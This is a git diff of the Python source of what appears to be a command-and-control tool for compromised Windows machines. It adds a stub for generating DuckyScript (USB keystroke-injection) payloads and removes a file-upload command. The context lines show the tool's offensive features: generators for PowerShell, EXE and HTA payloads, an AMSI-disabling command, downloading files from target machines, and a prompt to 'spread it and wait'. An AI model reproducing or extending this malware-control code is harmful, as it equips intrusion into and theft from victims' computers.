@@ -22,8 +22,9 @@ commands = {}
 key = "".join([random.choice(string.ascii_uppercase) for i in range(32)])
 aes_encryption_key = base64.b64encode(bytearray(key, "UTF-8")).decode()
 
-oct_commands = ["help", "exit", "interact", "list", "listeners", "listen_http", "listen_https", "delete", "generate_powershell", "generate_exe","generate_hta"]
-oct_commands_interact = ["load", "help", "exit", "back", "clear", "upload", "download", "load", "report", "disable_amsi", "modules"]
+oct_commands = ["help", "exit", "interact", "list", "listeners", "listen_http", "listen_https", "delete", "generate_powershell", "generate_exe","generate_hta", "generate_duckyscript"]
+
+oct_commands_interact = ["load", "help", "exit", "back", "clear", "download", "load", "report", "disable_amsi", "modules"]
 
 def check_url(url):
     if len(listeners_information) > 0:
@@ -144,6 +145,12 @@ def generate_hta(host_ip, port,proto):
     print("spread it and wait ;)")
     print((colored("#====================", "red")))
 
+def generate_duckyscript(hostname, path, proto, output_path):
+    # Open the ducky template
+    # Replace the URL
+    # Export to file
+    pass
+
 def generate_exe(hostname, path, proto, output_path):
 	if os.system("which mono-csc") == 0:
 		url = "{2}://{0}/{1}".format(hostname, path, proto)
@@ -204,6 +211,7 @@ def https_help_banner():
     print("certficate_path \t the full path for the ssl certficate")
     print("key_path \t\t the full path for the ssl certficate private key\n")
 
+
     print("Listener_name  \t\tlistener name to use")
 def interact_help():
 	print("\n")
@@ -213,7 +221,6 @@ def interact_help():
 	print("help  \t\t\t\tshow this help menu")
 	print("exit/back \t\t\texit current session and back to the main screen")
 	print("clear \t\t\t\tclear the screen output")
-	print("upload \t\t\t\tupload file to the target machine")
 	print("download \t\t\tdownload file from the target machine")
 	print("load \t\t\t\tload powershell module to the target machine")
 	print("disable_amsi \t\t\tdisable AMSI on the target machine")
